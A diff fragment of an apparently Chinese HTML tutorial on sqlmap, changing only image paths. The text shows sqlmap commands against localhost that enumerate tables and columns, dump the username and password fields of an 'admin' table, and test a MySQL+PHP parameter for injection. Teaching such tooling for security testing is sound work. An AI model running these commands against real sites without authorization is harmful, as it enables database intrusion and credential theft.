@@ -184,13 +184,13 @@
 <p>-v：详细登记（0-6，默认1）</p>
 <p>0：只显示python错误以及重要信息<br>1：显示信息以及警告<br>2：显示debug消息<br>3：显示注入payload<br>4：显示http请求<br>5：显示http响应头<br>6：显示http响应内容</p>
 </blockquote>
-<p>输出back-end DBMS:Microsoft Access<br>再出输入上面的命令，则会有注入语句提示<br><img src="/image/sqlmap%E4%BD%BF%E7%94%A8/1696501218533.png"></p>
+<p>输出back-end DBMS:Microsoft Access<br>再出输入上面的命令，则会有注入语句提示<br><img src="/undefined/c06d8347/sqlmap%E4%BD%BF%E7%94%A8/1696501218533.png"></p>
 <h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --tables</span><br></pre></td></tr></table></figure>
 
-<p><img src="/image/sqlmap%E4%BD%BF%E7%94%A8/1696501337723.png" alt="1696501337723"></p>
+<p><img src="/undefined/c06d8347/sqlmap%E4%BD%BF%E7%94%A8/1696501337723.png" alt="1696501337723"></p>
 <h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --columns -T admin</span><br><span class="line"><span class="comment"># -T admin    指定表名</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/image/sqlmap%E4%BD%BF%E7%94%A8/1696501371478.png" alt="1696501371478"></p>
+<p><img src="/undefined/c06d8347/sqlmap%E4%BD%BF%E7%94%A8/1696501371478.png" alt="1696501371478"></p>
 <h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --dump -C <span class="string">&quot;username,password&quot;</span> -T admin</span><br></pre></td></tr></table></figure>
 
 <h1 id="Mysql-php网站"><a href="#Mysql-php网站" class="headerlink" title="Mysql+php网站"></a>Mysql+php网站</h1><h2 id="检测是否存在注入-1"><a href="#检测是否存在注入-1" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid -v 1</span><br><span class="line"><span class="comment"># -p    指定测试参数</span></span><br></pre></td></tr></table></figure>
